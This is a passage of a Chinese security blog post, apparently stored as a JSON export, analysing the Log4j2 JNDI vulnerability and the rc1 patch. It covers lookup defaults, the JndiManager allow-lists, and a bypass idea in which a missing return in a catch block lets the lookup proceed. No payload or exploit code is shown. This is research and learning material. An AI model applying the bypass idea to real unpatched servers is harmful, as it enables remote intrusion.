referrerpolicy=\"no-referrer\"><br>构造方法中赋值的操作被拆分了，并且多了很多子类，将之前的功能模块化了<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710230516266-11ed551d-8086-406a-bfbb-0c56e9913e5c.png#averageHue=%23353c44&clientId=u64edae2b-8a46-4&from=paste&height=301&id=u84d3123e&originHeight=451&originWidth=1216&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=211014&status=done&style=none&taskId=u929b155e-b467-4993-b058-e581332d968&title=&width=810.6666666666666\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>也就是说在 newInstance 实例化方法中，他会根据判断条件来选择返回出哪一个 Converter，假如说我们还想跟进到之前的流程就必须要走到<code>LookupMessagePatternConverter</code>子类中<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710231892231-6e142419-8d30-4077-b6df-1b9aa89f76c2.png#averageHue=%23383e47&clientId=u64edae2b-8a46-4&from=paste&height=217&id=ub4478ed9&originHeight=325&originWidth=812&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=137427&status=done&style=none&taskId=uab3ee104-24cb-4c49-b877-a9a4d0e6709&title=&width=541.3333333333334\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br><code>LookupMessagePatternConverter</code>返回的条件是 <code>lookups &amp;&amp; config != null</code>，lookups 的获取就是新增的安全更新点，不再提供从 properties 中获取 lookups 配置的选项，而是直接从 loadLookups 方法中获取<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710230301371-348bcc78-9d5d-4736-8c75-75a17da1507d.png#averageHue=%23383e47&clientId=u64edae2b-8a46-4&from=paste&height=263&id=DwDLm&originHeight=395&originWidth=920&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=127744&status=done&style=none&taskId=u3c7f28bf-e7c0-4f1d-83b4-a6143c327c8&title=&width=613.3333333333334\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>这里 LOOKUPS 值为”lookups”字符串，options 默认为空，那么也就进不去 if 判断，默认 return false，lookup 功能默认不开启<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710232253258-cdcb5714-f625-4275-964e-574408f02526.png#averageHue=%23393f49&clientId=u64edae2b-8a46-4&from=paste&height=700&id=u29431b37&originHeight=1050&originWidth=1698&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=713237&status=done&style=none&taskId=ue9e0334f-b375-40e3-9e45-043bd388a56&title=&width=1132\" referrerpolicy=\"no-referrer\" alt=\"image.png\"></p>\n<h3 id=\"1x02-安全更新点-2\"><a href=\"#1x02-安全更新点-2\" class=\"headerlink\" title=\"1x02 安全更新点 2\"></a>1x02 安全更新点 2</h3><p>还有一个最直接的就是在 jndiManager 的 lookup 方法上，以及jndiManager 的创建上<br>具体内容如下：<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710232416843-f3b96ad0-5637-4f49-8dff-b8e78f13364d.png#averageHue=%23373d46&clientId=u64edae2b-8a46-4&from=paste&height=566&id=u467f17f2&originHeight=849&originWidth=1521&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=548930&status=done&style=none&taskId=uc7670195-cea5-447b-b24b-37b325db3c0&title=&width=1014\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br> 不再使用 InitialContext，而是使用子类 InitialDirContext，并为其添加白名单 JNDI 协议、白名单主机名、白名单类名  ，其中 permanentAllowedHosts 是本地 IP，permanentAllowedClasses 是八大基础数据类型加 Character，permanentAllowedProtocols 包含 java&#x2F;ldap&#x2F;ldaps。<br>关键函数 lookup 上也加了限制，不过在某些版本上 catch 块中没有 return，逻辑判断失误，之后依然可以调 context 的 lookup，所以只要想办法直接走到 catch 块中即可<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710232922287-851364a8-d373-4b72-bae3-cab28ee976c1.png#averageHue=%232d2b2b&clientId=u64edae2b-8a46-4&from=paste&height=421&id=u5f58f686&originHeight=632&originWidth=1748&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=148673&status=done&style=none&taskId=u3bbb45ca-ce58-42d7-af2d-117f91c3633&title=&width=1165.3333333333333\" referrerpolicy=\"no-referrer\" alt=\"1639332979607.png\"><br>不过我们这边更新的版本没有。。。。<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710233027158-5b624bff-1f76-4403-8fa2-64f2c220d251.png#averageHue=%23363d46&clientId=u64edae2b-8a46-4&from=paste&height=142&id=u14d4b8ef&originHeight=213&originWidth=949&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=63724&status=done&style=none&taskId=u253e2e68-02e6-44f1-96f9-2750661c4ee&title=&width=632.6666666666666\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>所以这里就复现不出来，其实这里的区别就是 rc1 和 rc2 的区别了，之后的版本由于默认 lookup 功能被关闭了，甚至直接移除了日志对 lookup 功能的支持，所以研究的价值不大了</p>\n<h1 id=\"个人总结\"><a href=\"#个人总结\" class=\"headerlink\" title=\"个人总结\"></a>个人总结</h1><p>这次的学习并不涉及 payload 绕过等操作，比如关键字截取，嵌套，带外等操作，感兴趣的师傅可以去<br><a href=\"https://su18.org/post/log4j2/#%E5%89%8D%E8%A8%80\">https://su18.org/post/log4j2/#%E5%89%8D%E8%A8%80</a> su18 师傅的博客<br><a href=\"https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/#Log4j2-%E5%A4%8D%E7%8E%B0\">https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/#Log4j2-%E5%A4%8D%E7%8E%B0</a>  drunkbaby 师傅的博客</p>\n<p>log4j 分析暂告一段落了，从 JNDI 的复习开始，有了一种新的感觉，新的学习的感觉，之前听队里的师傅说之前的漏洞调流程的时候要能够自己调出来，我并没有将这个事在自己心里强度，只是默认自己该这么做，也觉得自己现在可以有这样的能力，但还是缺少很多感觉，要走的路还有很长</p>\n","feature":true,"text":"复习完 JNDI 之后想专门过来学一下 log4j demo 实现与具体组件分析0x01 环境搭建在分析漏洞之前 ，log4j 的具体工作流程和组成很有必要去了...","permalink":"/post/Log4j漏洞分析","photos":[],"count_time":{"symbolsCount":"11k","symbolsTime":"10 mins."},"categories":[{"name":"锻刀的理论学习-log4j2","slug":"锻刀的理论学习-log4j2","count":1,"path":"api/categories/锻刀的理论学习-log4j2.json"}],"tags":[{"name":"锻刀","slug":"锻刀","count":14,"path":"api/tags/锻刀.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#demo-%E5%AE%9E%E7%8E%B0%E4%B8%8E%E5%85%B7%E4%BD%93%E7%BB%84%E4%BB%B6%E5%88%86%E6%9E%90\"><span class=\"toc-text\">demo 实现与具体组件分析</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA\"><span class=\"toc-text\">0x01 环境搭建</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02-log4j2-%E5%8A%9F%E8%83%BD%E7%BB%84%E4%BB%B6%E5%88%86%E6%9E%90\"><span class=\"toc-text\">0x02 log4j2 功能组件分析</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1x01-%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95-%E8%A7%A6%E5%8F%91%E7%82%B9%E2%80%94-AbstractLogger\"><span class=\"toc-text\">1x01 日志记录&#x2F;触发点—-AbstractLogger</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1x02-%E6%B6%88%E6%81%AF%E6%A0%BC%E5%BC%8F%E5%8C%96%E2%80%94-MessagePatternConverter\"><span class=\"toc-text\">1x02 消息格式化—-MessagePatternConverter</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1x03-%E5%AD%97%E7%AC%A6%E6%9B%BF%E6%8D%A2%E2%80%94-StrSubstitutor\"><span class=\"toc-text\">1x03 字符替换—-StrSubstitutor</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1x04-lookup-%E5%A4%84%E7%90%86%E2%80%94-Interpolator\"><span class=\"toc-text\">1x04 lookup 处理—-Interpolator</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90\"><span class=\"toc-text\">漏洞分析</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\"><span class=\"toc-text\">0x01 漏洞复现</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90\"><span class=\"toc-text\">0x02 流程分析</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90\"><span class=\"toc-text\">高版本绕过分析</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01-rc1-%E5%8F%8A%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">0x01 rc1 及绕过</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1x01-%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0%E7%82%B9%E5%88%86%E6%9E%90-1\"><span class=\"toc-text\">1x01 安全更新点分析 1</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1x02-%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0%E7%82%B9-2\"><span class=\"toc-text\">1x02 安全更新点 2</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">个人总结</span></a></li></ol>","author":{"name":"stoocea","slug":"blog-author","avatar":"https://bu.dusays.com/2024/07/29/66a7ad417ef9e.png","link":"/","description":"time thick away","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"最近的感想","uid":"45e2fa6203dde037520347ffddb2ac63","slug":"最近的感想","date":"2024-03-12T09:01:00.000Z","updated":"2024-06-28T15:04:46.015Z","comments":true,"path":"api/articles/最近的感想.json","keywords":null,"cover":"https://bu.dusays.com/2024/06/28/667ecf0120de9.webp","text":"算是年度总结吧，我不是很喜欢回顾自己过往做的好的事，所以年度总结什么的对于我来说只是消磨自己热情的一件事，但我很喜欢回顾自己如烂泥的那段时光，所以才有了这篇文章...","permalink":"/post/最近的感想","photos":[],"count_time":{"symbolsCount":468,"symbolsTime":"1 mins."},"categories":[{"name":"Life","slug":"Life","count":2,"path":"api/categories/Life.json"}],"tags":[{"name":"Felling","slug":"Felling","count":2,"path":"api/tags/Felling.json"}],"author":{"name":"stoocea","slug":"blog-author","avatar":"https://bu.dusays.com/2024/07/29/66a7ad417ef9e.png","link":"/","description":"time thick away","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"JNDIRe0","uid":"537c41713ba96f6a58c6622bc871aefc","slug":"JNDIRe0","date":"2024-03-11T03:10:00.000Z","updated":"2024-06-28T15:09:18.348Z","comments":true,"path":"api/articles/JNDIRe0.json","keywords":null,"cover":"https://bu.dusays.com/2024/06/28/667ecf00d23c4.webp","text":"什么是 JNDI英文全写为：Java Naming and Directory Interface，翻译叫做 JAVA 命名和目录接口，是 sun 公司提供的一...","permalink":"/post/JNDIRe0","photos":[],"count_time":{"symbolsCount":"19k","symbolsTime":"17 mins."},"categories":[{"name":"锻刀的理论学习-JNDIRe0反序列化","slug":"锻刀的理论学习-JNDIRe0反序列化","count":1,"path":"api/categories/锻刀的理论学习-JNDIRe0反序列化.json"}],"tags":[{"name":"锻刀","slug":"锻刀","count":14,"path":"api/tags/锻刀.json"}],"author":{"name":"stoocea","slug":"blog-author","avatar":"https://bu.dusays.com/2024/07/29/66a7ad417ef9e.png","link":"/","description":"time thick away","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true}}